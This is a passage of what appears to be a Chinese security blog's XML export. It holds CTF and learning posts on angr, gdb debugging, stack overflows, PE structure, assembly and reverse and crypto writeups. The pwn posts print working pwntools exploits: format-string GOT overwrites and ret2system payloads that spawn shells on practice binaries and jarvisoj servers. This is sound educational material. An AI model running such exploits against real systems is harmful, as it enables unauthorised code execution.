fpLT(fpAdd(&apos;RNE&apos;, FPS(&apos;FP_b_0_64&apos;, DOUBLE), FPV(2.0, DOUBLE)), FPV(0.0, DOUBLE))&gt; raw_to_bv()与raw_to_fp()BV与FP之间也是可以进行相互转换的，如下所示: a.raw_to_bv() //&lt;BV64 0x400999999999999a&gt; b.raw_to_bv() //&lt;BV64 fpToIEEEBV(FPS(&apos;FP_b_0_64&apos;, DOUBLE))&gt; state.solver.BVV(0, 64).raw_to_fp() //&lt;FP64 FPV(0.0, DOUBLE)&gt; state.solver.BVS(&apos;x&apos;, 64).raw_to_fp() //&lt;FP64 fpToFP(x_1_64, DOUBLE)&gt; val_to_bv()与val_to_fp()第二中转换方法必须以目标值的大小或者种类作为参数： a //&lt;FP64 FPV(3.2, DOUBLE)&gt; a.val_to_bv(12) //&lt;BV12 0x3&gt; a.val_to_bv(12).val_to_fp(state.solver.fp.FSORT_FLOAT) //&lt;FP32 FPV(3.0, FLOAT)&gt; 运算求解前面我们已经提及了solve下的eval，使用这个进行求解。它还有其他求解模式如下： solver.eval(expression) 将给出一个给定表达式的可能解决方案。 solver.eval_one(expression) 将为您提供给定表达式的解决方案，或者如果可能有多个解决方案则抛出错误。 solver.eval_upto(expression, n) 将为您提供最多n个给定表达式的解决方案，如果可能少于n，则返回少于n个。 solver.eval_atleast(expression, n) 将给出给定表达式的n个解决方案，如果可能少于n则抛出错误。 solver.eval_exact(expression, n) 将为您提供给定表达式的n个解决方案，如果少于或多于可能，则抛出错误。 solver.min(expression) 将为您提供给定表达式的最小可能解决方案。 solver.max(expression) 将为您提供给定表达式的最大可能解决方案。 在这些模式求解中，我们对结果可以进行规定，参数关键字如下两种： extra_constraints可以作为约束元组传递。此评估将考虑这些约束，但不会添加到状态。 ast_to可以传递数据类型以将结果转换。目前只能转换为str，这将导致该方法返回基础数据的字节表示。例如，state.solver.eval(state.solver.BVV(0x41424344, 32), cast_to=str)将返回”ABCD”。 Angr之程序状态在程序运作的过程中，内存以及寄存器的信息是很重要的，这里如果对程序加载过后，即可或得寄存器或是内存中的相关信息，并可以实现拷贝造作。 state.regs.rbp = state.reps.rsp //拷贝rsp到rbp state.mem[0x1000].uint64_t = state.regs.rdx //储存rdx的信息到0x1000 state.regs.rbp = state.mem[state.regs.rbp].uint64_t.resolved //清楚rbp state.regs.rax += state.mem[state.regs.rsp + 8].uint64_t.resolved //add rax, qword ptr [rsp + 8] state.reg后面接寄存器名即可查询寄存器的信息或者是对数据进行操作; state.mem用于从内存加载类型化数据，但是如果想在在内存范围内进行原始加载或者存储的话就比较麻烦。可以使用state.memory解决这个问题。 s = proj.factory.blank_state() //创建一个空白状态 s.memory.store(0x4000, s.solver.BVV(0x1234, 64)) //存储数据到0x1234 s.memory.load(0x4004, 6) # load-size is in bytes //加载0x4004处的数据，返回&lt;BV48 0x89abcdef0123&gt; 前面所涉及的装载，factory意味工厂，里面后集中状态如下： .blank_state()构造一个“空白状态”，其大部分数据未初始化。访问未初始化的数据时，将返回无约束的符号值。 .entry_state() 构造一个准备在主二进制文件入口点执行的状态。 .full_init_state()构造一个准备通过任何需要在主二进制文件入口点之前运行的初始化程序执行的状态，例如，共享库构造函数或预初始化程序。完成这些后，它将跳转到入口点。 .call_state() 构造一个准备执行给定函数的状态。 Angr之Simulation_ManagerAngr中最重要的就是Simulation_Manager，它允许同时控制状态组的符号执行，应用探索策略来探索程序的状态空间。 步进和gdb或者od的动态调试类似，我们想要探索一个程序除了让他自动执行，我们也可以控制执行。通过一个基本块将给定存储中的所有状态向前步进。 import angr proj = angr.Project(&apos;examples/fauxware/fauxware&apos;, auto_load_libs=False) state = proj.factory.entry_state() simgr = proj.factory.simgr(state) simgr.active //&lt;SimState @ 0x400580&gt; simgr.step() simgr.active //[&lt;SimState @ 0x400540&gt;] 如果在符号执行过程中遇到了分支情况的话，两个后继状态都会出现在储存当中，并且可以同步两个状态。但是如果不太注重中间过程的分析的话。可以直接使用run进行操作： #使用step while len(simgr.active) == 1: simgr.step() simgr //&lt;SimulationManager with 2 active&gt; simgr.active //[&lt;SimState @ 0x400692&gt;, &lt;SimState @ 0x400699&gt;] #使用run simgr.run() simgr //&lt;SimulationManager with 3 deadended&gt; Stash Management理解为存储管理，为了使状态与存储空间间调配移动，可以使用move(),那么这里就要指定，从哪儿来，到哪儿去，要做什么。及from_stash，to_stash以及filter_func（可选，默认是将一切）。例如，移动输出中具有特定字符串的所有内容： simgr.move(from_stash=&apos;deadended&apos;, to_stash=&apos;authenticated&apos;, filter_func=lambda s: &apos;Welcome&apos; in s.posix.dumps(1)) simgr //output:&lt;SimulationManager with 2 authenticated, 1 deadended&gt; 这里就是将带有Welcome字符的所有输出进行存储，新建的存储名为’authenticated’。得到的存储实际上是一个列表，可以通过迭代进行逐个访问。当然，如果在存储名前加上one_,那么将会返回存储空间中的第一个状态，如果加的是mp_,那么将会返回多个存储信息。 for s in simgr.deadended + simgr.authenticated: print hex(s.addr) //output:0x1000030 0x1000078 0x1000078 simgr.one_deadended //output: &lt;SimState @ 0x1000030&gt; simgr.mp_authenticated //output: MP([&lt;SimState @ 0x1000078&gt;, &lt;SimState @ 0x1000078&gt;]) 除了deadended，还有其他的几种存储类型如下所示： 类型 描述 active 除非指定了备用存储，否则默认执行步进状态 deadended 程序遇到错误停止，正常结束或者是指令指针无效等。状态转到退出的存储 pruned 使用时LAZY_SOLVES，除非绝对必要，否则不会检查状态是否满足。当存在状态时发现状态不满LAZY_SOLVES时，遍历状态层次结构以识别其历史上最初变得不饱和的状态。 unconstrained 标志为不受约束的状态，由用户数据或某些其他符号数据源控制的指令指针放置在此处 unsat 标志为不可满足的状态，即具有矛盾的约束 上述方法的利用可以在这里这里这里看到使用方式。 小结工欲善其事必先利其器，这里把Angr常用常见的方法都进行了学习总结，下面就要结合实例进行熟练了。]]></content>
      <categories>
        <category>binary</category>
      </categories>
      <tags>
        <tag>Angr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gdb.attach跟exp]]></title>
    <url>%2F2018%2F05%2F30%2Fgdb-attach%E8%B7%9Fexp%2F</url>
    <content type="text"><![CDATA[好久不跟，每次图片都要生成链接，emmm………说到底还是懒。还是该坚持。 前言学pwn之路上的一个必经之路就是debug，前几天看到一个格式化的题目，在安全课上有相关文章（戳我），对就是那个CCTF-PWN3，exp逻辑很简单，跟着bin看一下exp就能明白，但是始终EOF，无法成功getshell，还记得学长跟我们说过的：做pwn题关键就在于跟exp，了解是哪里利用不对。OK，那就学学如何attach。 正文先贴上自己做这题的exp,具体的利用逻辑可以到上面的那个文章里进行查看： #!/usr/bin/env python from pwn import * context.log_level = &apos;debug&apos; elf = ELF(&apos;pwn3&apos;) libc = ELF(&apos;libc.so.6&apos;) pr = process(&apos;./pwn3&apos;) #gdb.attach(pr, &apos;b *0x804889B&apos;) username = &quot;rxraclhm&quot; pr.recvuntil(&quot;Name (ftp.hacker.server:Rainism):&quot;) pr.sendline(username) # 1 -&gt; get # 2 -&gt; put # 3 -&gt; dir # other -&gt; exit def put(pr, name, content): pr.recvuntil(&quot;ftp&gt;&quot;) pr.sendline(&apos;put&apos;) pr.recvuntil(&quot;upload:&quot;) pr.sendline(name) pr.recvuntil(&quot;content:&quot;) pr.sendline(content) def get(pr, name, num): pr.recvuntil(&quot;ftp&gt;&quot;) pr.sendline(&apos;get&apos;) pr.recvuntil(&apos;get:&apos;) pr.sendline(name) return pr.recvn(num) def dir(pr): pr.recvuntil(&quot;ftp&gt;&quot;) pr.sendline(&apos;dir&apos;) plt_puts = elf.symbols[&apos;puts&apos;] print &apos;plt_puts= &apos; + hex(plt_puts) got_puts = elf.got[&apos;puts&apos;] print &apos;got_puts= &apos; + hex(got_puts) # /bin/sh pause() put(pr, &apos;/sh&apos;, &apos;%8$s&apos; + p32(got_puts)) text = get(pr, &apos;/sh&apos;, 4) puts_addr = u32(text) print &apos;puts_addr= &apos; + hex(puts_addr) system_addr = puts_addr - (libc.symbols[&apos;puts&apos;] - libc.symbols[&apos;system&apos;]) print &apos;system_addr= &apos; + hex(system_addr) def foo(name, address, num): num = num &amp; 0xff if num == 0 : num == 0x100 payload = &apos;%&apos; + str(num) + &apos;c%10$hhn&apos; payload = payload.ljust(12, &apos;A&apos;) put(pr, name, payload + p32(address)) get(pr, name, 0) foo(&apos;n&apos;, got_puts, system_addr) foo(&apos;i&apos;, got_puts+1, (system_addr&gt;&gt;8)+6) foo(&apos;b&apos;, got_puts+2, system_addr&gt;&gt;16) foo(&apos;/&apos;, got_puts+3, system_addr&gt;&gt;24) #put(pr, &apos;/sh&apos;, &apos;%8$s&apos; + p32(got_puts)) text = get(pr, &apos;/sh&apos;, 4) puts_addr = u32(text) print &apos;puts_addr= &apos; + hex(puts_addr) # system(&quot;/bin/sh&quot;) dir(pr) pr.interactive() 我们直接本地执行是无法getshell的 那么到底什么地方出了问题呢，有了利用逻辑，可以根据自己的逻辑一个一个的排查： 泄漏的system地址错误？ 这个题目第一步就是利用格式化字符串泄漏puts的真实地址然后根据libc的偏移计算出system的地址。那么会不会是libc出了错误呢？ attach是时候表示一下了,这里其实可以直接在exp里调用attach，这里为了看的清楚，手动attach。在泄露位置下断点，然后在gdb中attach相关pid启动调试 然后在gdb中需要在一个地方下断点使得程序进入相关位置进行观察，然后c到相关位置（这里需要在左边的DEBUG终端内触发一下才可以继续。）然后在gdb中把puts地址打印出来，和泄漏的进行对比。嗯，这个可能排除。 覆写出了问题？泄漏出来地址之后就是构思如何执行system(/bin/sh)看到dir函数里有一个puts函数，我们进行利用格式化字符把puts的地址进行覆写，在执行puts(/bin/sh),就变成了system(/bin/sh) 这里会不会是覆写出了问题呢？可以看一看。直接在puts的调用地方下断点。 直接c到相关位置: 可以看出来，参数/bin/sh已经成功写入，那么与puts绑定的got有没有成功改写呢？继续跟。s进入puts 下图可以看出我们覆写的是没有问题的。额。。的确puts的got被我们改成了我们计算出来的system的地址了。 libc不匹配那就奇怪了，为什么没有成功getshell呢？下图给你答案，libc不匹配，通过提供的libc的offset计算的system地址是不正确的。 这里我们看到c3和c9相差了6，那么我们将覆写system地址对应位置加上6即可覆写成功，即（foo(‘i’, got_puts+1, (system_addr&gt;&gt;8)+6)）或者是去找到对应的libc直接跑exp即可getshell。 总结我曾请教过一个大佬，如何学习pwn，他给我的意见就是到XCTF社区把那些热门题目跟exp多熟悉即可。的确，用好资源,重在积累。]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[校赛Reverse&Crypto writeup]]></title>
    <url>%2F2017%2F12%2F02%2F%E6%A0%A1%E8%B5%9BReverse-Crypto-writeup%2F</url>
    <content type="text"><![CDATA[2017.12.2日举办的校赛圆满结束，整理一下我们小组出的逆向和密码学的writeup Reverse简单的Re这道真的很简单，我们直接IDA内一顿操作，找到关键地方，如下图所示： 正确flag与0x53异或一下得到的结果就是程序内的自带数据，不多做解释。 a=[53,63,50,52,40,1,96,37,54,103,32,58,**,**,**,**,32,12,102,60,12,58,61,39,54,97,54,102,39,33,63,61,52,46] flag=&apos;&apos; for i in range(0,len(a)): flag+=chr(a[i]^0x53) print(flag) 来自计算机七号的挑（song）战（fen）很有深度的一道题目，IDA看一下 大致逻辑可以看得很清楚，我们输入的flag和7异或后加上7存放于一个数组中，问题在于后面是和什么异或然后和内存数据进行比较的呢？ IDA看不到只能用OD跟踪了。 这里可以看到是和什么异或然后和239之类的数据进行比较的。所以说，我们可以修改跳转把所有的异或数据全部拿出来，最后15个数据为：jblg8DD3qFr04i4 OK，flag就是一个脚本的问题了。 Android_B一道安卓题目，app就先下载下来玩玩嘛，安装完打开发现页面上有一个按钮，按不了. 题目描述按到就给flag，也不知道是不是骗人，那就试试呗，程序猿肯定把butto的click功能给false了，那么我们只要找到smail文件的关键位置把false改成true就行了，剩下就是把猜想付诸于行动。 OK改完了，那么我们重新编译然后再安装试试，发现真的给了一串乱码数据，管他呢，试试先，提交乱码的MD5值，Bingo，过了。 破解快乐打开程序看一看 java写的一个程序，用jd-gui打开源码看看。主要的程序就是下面四个，其中第二个注意是一个提示的坑，不要踩进去，整理一下逻辑写个脚本结束。 第一幅图的拷贝函数很迷惑人， 看准跳转是关键！贴下脚本： def diedai(n): if n &gt;2: return diedai(n-1)+diedai(n-2) else: return 1 def change(n,k): return diedai(n)%len(k) if __name__ == &apos;__main__&apos;: str = &quot;vÈ¾¤ÊÊ¬ÆÆÊvÌ¤Ê²Ê²ÀÎ¤¨¸¬&quot; x = [] for i in range(len(str)): x.append(chr((ord(str[i]) &gt;&gt; 1) + 15)) key=&apos;&apos;.join(x) s=[] z1=0 for z2 in range(0,4): for z3 in range(0,4): s.append(key[change(z1+z3,key)]) z1+=5 print(s) Android2这题给了一个加密文件，一个apk，还是安装看看。 发现里面有两个按钮，一个加密，一个解密，但是解密按完程序就蹦了，只有加密能出东西，而且他里面自己设置了一个类似密钥的东西，那就分析一下代码 关键代码是这一点，解密内没有代码，他的重要操作就是异或，异或可以，但是下面有图片验证，那么我们先把后缀改为图片后缀，然后再次加密，试试看嘛。 OK,加密图片解出来了，大吉大利今晚吃鸡。图片上的base16解密即可。 Maze这个程序打不开。 提示和数据打打交道，看看Hex PE头应该在80H处，但是80H处是2333，所以把2333改成PE头就行 OK程序可以打开其实这个考察也不一定要解开，主要writeup在此： 点我点我 一起来“胖”啊简单的格式化字符串漏洞，利用漏洞泄漏任意函数的真实地址，然后在lib中找到偏移地址算出system的真实地址，再次利用system，传入/bin/sh参数完成利用 exp： from pwn import * \#context.log_level = &apos;debug&apos; p = remote(&quot;192.168.1.113&quot;, 8888) \#p=process(&quot;./pwne&quot;) \# get printf libc addr printf_got = 0x0804a010 leak_payload = &quot;bb%6$saa&quot; + p32(printf_got) p.recvuntil(&quot;Hello, World\n&quot;) p.sendline(leak_payload) p.recvuntil(&quot;bb&quot;) info = p.recvuntil(&quot;aa&quot;)[:-2] print info.encode(&apos;hex&apos;) \# get system libc addr print_addr = u32(info[:4]) print &quot;print_addr:&quot;+hex(print_addr) \#p_s_offset = 53479 # addr(printf) - addr(system) printf_offset=0x4D280 system_offset=0x40190 system_addr = print_addr - printf_offset + system_offset print &quot;systen_addr:&quot;+hex(system_addr) \# get payload payload = fmtstr_payload(4, {printf_got: system_addr}) \# send payload p.recvuntil(&quot;Hello, World\n&quot;) p.sendline(payload) p.sendline(&apos;/bin/sh&apos;) p.interactive() Crypto密码学100很简单，凯撒加栅栏的加密，解密一下即可，注意大小写的存在： 先栅栏解密agvb{Tjp_1Mz_X1zQzm} 然后凯撒移位flag{You_1Re_C1eVer} 贝斯家族根据描述可以知道，flag加密了36次base64，又加密一次base16脚本： import base64 f=open(&quot;E:\Users\dd.txt&quot;,&apos;r&apos;) flag = f.read() flag = base64.b16decode(flag) for i in range(36): flag=base64.b64decode(flag) print(flag) ###RSA 分析流量包提取有用信息： 看到有三个key的压缩包，压缩包可以通过foremost或者binwalk提取出来。 key1：—–BEGIN PUBLIC KEY—–MIGAMA0GCSqGSIb3DQEBAQUAA28AMGwCZQCnZIbrdaPobT4Ia+0c3yj+tR7l6prJbyoeOrDRK5mXyasdn8HSExKeruRFMELsOupuF0Dw15zKzv8+9J+SQjE+7eZ/svRDC6aPXQZGXKtcMiIqlHa4Q3hI6cw3WFgbYdIlC1OZAgMBAAE=—–END PUBLIC KEY—– key2：—–BEGIN PUBLIC KEY—–MIGAMA0GCSqGSIb3DQEBAQUAA28AMGwCZQCnZIbrdaPobT4Ia+0c3yj+tR7l6prJbyoeOrDRK5mXyasdn8HSExKeruRFMELsOupuF0Dw15zKzv8+9J+SQjE+7eZ/svRDC6aPXQZGXKtcMiIqlHa4Q3hI6cw3WFgbYdIlC1OZAgMBAAM=—–END PUBLIC KEY—– 还有两个cry的txt需要扣取出来就好。 分解两个公钥得到不同的两个不同的e和一个相同的n，会玩rsa的就可以知道是共膜攻击。 写代码，解题再转码转字符得到flag。脚本：#!/usr/bin/env python3# coding:utf-8import binasciidef modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception(&apos;modular inverse does not exist&apos;) else: return x % m def egcd(a,b): if a==0: return (b,0,1) else: g,y,x=egcd(b%a,a) return (g,x-(b//a)*y,y) def main(): #c1为密文1 c1=2030811156522080479534380585679540224811392358471221121903500951020792730252365410965194272526859671449231195224643995533159581726005071102332599685927429796174012361879498368574822467464773239467267683166997996469735733139730718951657093072#c2为密文2 c2=432349880784956087467730931619622010551468577048036338892145633949921703163476344960761289142596504797262111871151379630491409846619636163453069518097091623785238077044180062258181941690990234123420861146760076308983603961910238392785031770#n为模 n=0xa76486eb75a3e86d3e086bed1cdf28feb51ee5ea9ac96f2a1e3ab0d12b9997c9ab1d9fc1d213129eaee4453042ec3aea6e1740f0d79ccaceff3ef49f9242313eede67fb2f4430ba68f5d06465cab5c32222a9476b8437848e9cc3758581b61d2250b5399 #egcd()两个参数分别为e1和e2s = egcd(65537, 65539)s1 = s[1]s2 = s[2]if s1&lt;0: s1 = - s1 c1 = modinv(c1, n)elif s2&lt;0: s2 = - s2 c2 = modinv(c2, n)m = (pow(c1,s1,n)*pow(c2,s2,n)) % nh = hex(m)[2:-1]print binascii.a2b_hex(h)if name == ‘main‘: main() 4.得到flag：flag{deciphering_is_very_interesting}]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[缓冲区溢出--栈溢出]]></title>
    <url>%2F2017%2F09%2F30%2F%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA-%E6%A0%88%E6%BA%A2%E5%87%BA%2F</url>
    <content type="text"><![CDATA[隔了好久不更，今儿就把搞懂的32位下和64位下的栈溢出漏洞分享一下咯，太菜，求大佬放过。 Ⅰ.预热搞懂栈溢出前提得把函数调用的时候栈内的变化和操作顺序，esp和ebp两个寄存器中指针的变化。这两个方面可参照前面这篇文章。 Ⅱ.原理①.简介栈溢出，顾名思义，就是把栈给搞炸，通过覆盖的方式把需要利用的地方进行修改，从而达到攻击的效果。 ②.细说借用一下前面的图和例子，main函数在调用func_A函数的时候会主动压入返回地址，这个返回地址是为了让func_A执行结束之后能找到回家的路（也就是回到母函数内执行。)然后就是funcA局部变量入栈，最后跳转到代码区进行执行指令了。func_B被调用func_A也重复了main函数的工作，这里就不在多说。 那么在func_B执行的时候，我们计算好局部变量（后面简称buf）的大小，假设为0x16这么大，那么就可以用0x16的任意数字或字母进行填充，这样这个盒子就被填满了， 另外别忘了，现在func_B现在在栈里打头阵的，所以esp和ebp分别在栈帧上方和局部变量下方，那么ebp也需要被填充，这里要注意在32bit下是4字节，而在64bit下就是8字节了。 同样是任意字符填充，再往下就是返回地址了，关键地方，然后我们想要调用的函数地址get到之后将原来的返回地址已覆盖就完成漏洞利用了。 ③.传参32bit：参数是直接存放在栈中的。 64bit：如果函数的参数数量小于 6 , 则从左至右依次存放在寄存器 :rdi, rsi, rdx, rcx, r8, r9 如果大于 6 , 那么多出来的参数按照从右至左的顺序依次压栈x64的栈帧在返回地址额下面 给一个看到的链接，关于64bit的传参问题 Ⅲ.乘热打铁。来两道例题练练好了。这里是出处 ①.32bit：主函数，里面有一个函数调用。 跟进来，定义了数组大小0x88(ebp-88h看出)，read读入数据，那就可以进行利用。 查看一下导入表，程序已经给绑定好了system函数，和/bin/sh这个command，那么我们直接把地址拿来用就好了。 贴上简单的exp：（junk和ebp做到覆盖buf数组，然后覆盖返回地址为system的调用地址，最后给函数传入指令参数，完成利用。这里的p32是为了让系统能够接收而对地址进行了打包，下面例子中p64也是同样的效果。p.send是向服务器发送数据，最后一句是与服务器交互。） from pwn import * #buf=0x88 #p = process(&apos;./level&apos;) p = remote(&apos;pwn2.jarvisoj.com&apos;,9878) systemaddr=0x08048320 shelladdr=0x0804A024 junk=&apos;a&apos;*0x88 ebp=&apos;aaaa&apos; payload=junk+ebp+p32(systemaddr)+p32(4)+p32(shelladdr) p.send(payload) p.interactive() ②.64bit：和上面一题是孪生兄弟，只是一个32bit，一个64bit下的。程序一模一样，所以思路也就类似，如图。 直接给出exp：（ELF是加载level2_x64程序。下面一句则可以直接获得system的调用位置，前面提到，64bit下参数是提前存放在寄存器中，然后函数需要参数时候，由寄存器传参。因为我们只需要传入command参数，所以我们只需要知道rdi寄存器所在位置。最后步骤就是，0x80(buf)+8(ebp)+到寄存器地址+传入参数+system函数调用） from pwn import * #buf = 0x80 #p=process(&apos;./level2_x64&apos;) p=remote(&apos;pwn2.jarvisoj.com&apos;,9882) level2=ELF(&apos;./level2_x64&apos;) systemaddr=level2.plt[&apos;system&apos;] print systemaddr shelladdr=0x0000000000600a90 rdireaddr=0x00000000004006b3 payload=&apos;a&apos;*136+p64(rdireaddr)+p64(shelladdr)+p64(systemaddr) p.send(payload) p.interactive()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XMAN排位赛-babymaze]]></title>
    <url>%2F2017%2F08%2F10%2FXMAN%E6%8E%92%E4%BD%8D%E8%B5%9B-babymaze%2F</url>
    <content type="text"><![CDATA[暑期XMAN排位赛中一道逆向思路 看到题目名字，babymaze，中文意思是婴儿迷宫，看来是一个跟迷宫有关的题目。要不就是迷宫清空，要不就是走出迷宫。 好了，咱先打开题目输入看看，为了看得清楚防止一闪而过，我们就用OD打一个辅助好了。 word天，居然还是日文，吓的我赶紧翻译了一波，好像是不对的意思吧。。暂且不管。用IDA看看关键代码吧。 又发现一撮日文，一个个翻译了下，意思已经标注，（如上图所示）有正确提示和错误提示，但是就是没有发现刚才出现的那个提示，所以想这个还是一个调用，所以我们往前追溯。 Ok,找到了，上图可以看出第一步，也就是flag的格式了，必须是xman{xxxxxxxx}的格式，那么，在123和125的验证中间还有一个函数调用，这儿也就是我们刚才看到的那另一串答案提示了。 看上图这一串数据，应该就是构成迷宫的关键了吧，如果看不出来咱可以用OD，验证一下咯，输入xman{1231231231231234},这样程序就会跑到那儿去进行赋值进行迷宫的制造，然后我们看看数据就可以看出来迷宫了。 我们把迷宫排列一下就是下面这个样子了。 继续往下分析。看到了四个判断嵌套，分别是1，2，3，4的if判断，点进去看的东西如下图注释，1234分别代表左右上下。除此以外我们还可以看出A1指针代表列，A2指针代表行。 要问判断依据？，看下面这个图的红色剪头，由于刚才看到的迷宫是六行九列的，那么与9相乘的数据就是列所在指针，后面的加数就是行所在指针，而且这里红色箭头指向的函数返回的数据是与32进行对比是否一样，一样则是0，那么和1异或，如果不一样，你懂得。~~~ 而32的十六进制就是0x20也就是迷宫的数据，我们把迷宫用01进行填充一下好了。 下面就剩下最后的两个判断，一是是否走到尽头，二是是否只走了16步。 OK，全部搞懂了吧，开始你的迷宫之旅。]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[小论PE结构]]></title>
    <url>%2F2017%2F07%2F21%2F%E5%B0%8F%E8%AE%BAPE%E7%BB%93%E6%9E%84%2F</url>
    <content type="text"><![CDATA[前面在二进制文件中小提了一下PE结构，只是皮毛，这里在做一些添加。 PE文件的概念弱弱的解释一下：PE(Portable Executable)文件称为可移植的可执行的文件，是微软Windows操作系统上的程序文件，包括EXE、DLL、SYS等。 PE文件的结构主要就是下图所示的三大块儿 PE结构之DOS头所有的PE文件都是以一个64字节的DOS头开始。这个DOS头只是为了兼容早期的DOS操作系统。 PE结构之PE文件头PE文件头是PE文件格式各部分中信息以及结构较为复杂的一个部分，主要包含三部分： PE文件标志 映像文件头* 可选文件头 PE文件标志是一个常量，即“PE00”，它标志着PE文件头的开始，同时它也是PE文件的一个主要标识。可以通过DOS头中e_lfanew找出该标志的位置。 映像文件头，它紧跟在PE文件标识的后面，映像文件头是一个结构体。 Machine代表着改程序要执行在的计算机的类型；NumberOfSections表明了该PE文件的节数，该值与表的数量以及节表的数量应保持一致；SizeOfOptionalHeader表明了可选映像头的大小。 可选映像头，尽管名字是可选映像头，但是事实上它并不是可选而是必须存在的，是“必选”的。 PE结构之节表节表是紧挨着NT映像头的一结构数组，它的数量与节的数量是一致的，也与映像头文件中NumberOFSections是一致的。 PE结构之节信息这里在前面也提及到了，PE文件格式把可执行文件分成若干个数据节(section)，不同的资源被存放在不同的节中，PE文件中的节类型包括： .text 由编译器产生，存放着二进制的机器代码，也是反汇编和调试的对象 .data 初始化的数据块，如宏定义、全局变量等 .idata 可执行文件所使用的动态链接库等外来函数与文件的信息 .rsrc 存放程序的资源，如图标、菜单等 .reloc、edata、.rdata等 PE文件的查看注意，分析一波，在此之前贴一个PE图，参照这个进行分析： OK,随机打开一个PE可执行文件。 上图的1标记处看出MZ长度虽然不定，但是E-lfanew的位置却是定的，在3ch处，这个很关键，因为PE文件头部就是有e_lfanew定位的. 那从上面的3ch处发现了PE文件头的位置就在00E8，是不是呢？继续往下看。图的2标记处看出DOS处长度不定。 上图可以看出DOS的所占很长，基于E-lfanew偏移大小为ACH，后面就是PE文件头所在位置，也的确就在00E8处。 最后看图的3标记处，也就是说PE文件后缀所在位置，那标准位置就是基于PE头偏移04h+14h-2h=16h处也就是下图选中的位置。 下面再看看节的信息，就以.text为准吧。看看PE结构表。 如上图所示，偏移量在字节表头地址偏移14h后面。那就在右边找到.text字节位置处。向后找14h处偏移，得到.text节基于PE文件的偏移为0400，如下图所示。 验证一下，转到0400地址处，的确是.text节的存储数据。如下图所示： 最后贴上整理比较详细的一些PE结构讲解： http://blog.csdn.net/evileagle/article/details/11693499 http://www.cnblogs.com/guanlaiy/archive/2012/04/28/2474504.html]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>PE结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编子程序]]></title>
    <url>%2F2017%2F07%2F20%2F%E6%B1%87%E7%BC%96%E5%AD%90%E7%A8%8B%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[前面总结了汇编的寄存器及相关知识，这里了解一下汇编代码的编写并做一个读代码小练习。 代码解析assume cs:code data segment db &apos;conversation&apos;,0 data ends code segment start: mov ax,cs mov ds,ax mov si,offset capital//cs:si 为capital所在代码开始,在汇编中表示某位置使用段地址+偏移量来进行定位的，下面的读取也是类似。 mov ax,0 mov es,ax mov di,200h //es:di 为200h+0开始 mov cx,offset capitalend-offset capital ;两地址相减作为复制长度 cld ;清除DF标志为0，是数据按地址又低到高的正确顺序传输 rep movsb ;DS:SI这段地址的N个字节复制到ES:DI指向的地址 ;以上一段代码作用为从capital段到capitalend复制code到200h+0的位置,共11h行 mov ax,0 mov es,ax mov word ptr es:[7ch*4],200h mov word ptr es:[7ch*4+2],0//这两行作用为指定int 7ch开始地址为200h(这里的7ch是我们自己定义的中断，中断的赋值概念低地址位为偏移量，高地址位为段值) mov ax,data//这里也就是0000:0200位置 mov ds,ax mov si,0 int 7ch；自定义终端，不一定为7c ;调用复制的capital代码 mov ax,data mov es,ax;数据起地址data mov bp,0;偏移量0 //这里取es:bp位置的值，也就是转化之后的数据 mov al,0;光标跟随输出位置 mov bl,9;蓝色高亮 mov bh,0;页数,0为当前页 mov dh,0;y坐标 mov dl,0;x坐标 mov cx,12;12个大小的长度 mov ah,13h;输出字符 ;上方为设置参数 int 10h//这里是int 10h截断，有相关网址进行介绍 ;输出 mov ax,4c00h int 21h ;退出 capital: push cx；压入cx用以计数 push si；压入si用以计数 change: mov cx,[si] mov ch,0 jcxz ok；判断cx为0退出 and byte ptr [si],11011111b;a=&apos;1100001&apos; A=&apos;1000001&apos;所以‘&amp;’一下就是就是小写字符转化为大写字符了。 inc si jmp short change ok: pop si;执行si出栈 pop cx；执行cx出栈 iret capitalend: nop code ends end start 相关知识点程序详解:http://blog.sina.com.cn/s/blog_171daf8e00102xcur.html 汇编语言的调试方法：http://www.cnblogs.com/hustlijian/archive/2011/06/04/2072656.html Int 10h相关设置的知识点：http://www.cnblogs.com/magic-cube/archive/2011/10/19/2217676.html 汇编中字、双字、字节关系：https://zhidao.baidu.com/question/270682681.html 程序中出现的rep movesb 以及cld详解：https://zhidao.baidu.com/question/270682681.html]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>汇编基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XMAN练习 writeup及所得]]></title>
    <url>%2F2017%2F07%2F19%2FXMAN%E7%BB%83%E4%B9%A0writeup%E5%8F%8A%E6%89%80%E5%BE%97%2F</url>
    <content type="text"><![CDATA[XMAN夏令营虽然没参加，但是选拔赛的题目还是乘着闲暇时间做了几道，并且也学习到了一些。在这里做个总结。 第一道reverse老规矩就IDA看一波 找关键字符，跟踪过去F5大法。下图很明显关键处，而if判断便是重要所在。 这个题目逻辑还是很清晰的，里面自带的乍一看以为是Base64，然而编译出来的不知道什么鬼，在往下看，将我们输入的19位异或操作然后sub_4996DD函数又是一通操作，其实就是做了Base64转换，为什么看出来，应为上面的Base64解码就是19位，根据特性所以猜测如此 那就很明了了，逆运算即可，附上代码： from base64 import * w=&apos;WEw2TX82amFXOFlUXz1RSUVfbw==&apos; t=b64decode(w) print(t) q=&apos;&apos; for j in range(len(t)): q+=chr(ord(t[j])^j) print(q) 第二道安卓直接反编译一波 明显的correct和failed提示，关键就是encode.check了 跟过去，可以看到算法，也很简单输入的字符与b进行加法运算与61取模然后乘2再减去循环次要和输入的一样，那就爆破吧。 附上代码： b = [23, 22, 26, 26, 25, 25, 25, 26, 27, 28, 30, 30, 29, 30, 32, 32] w=&apos;&apos; for i in range(len(b)): for j in range(127): if ((j+b[i])%61)*2-i==j: w+=chr(j) print(w) 第三道 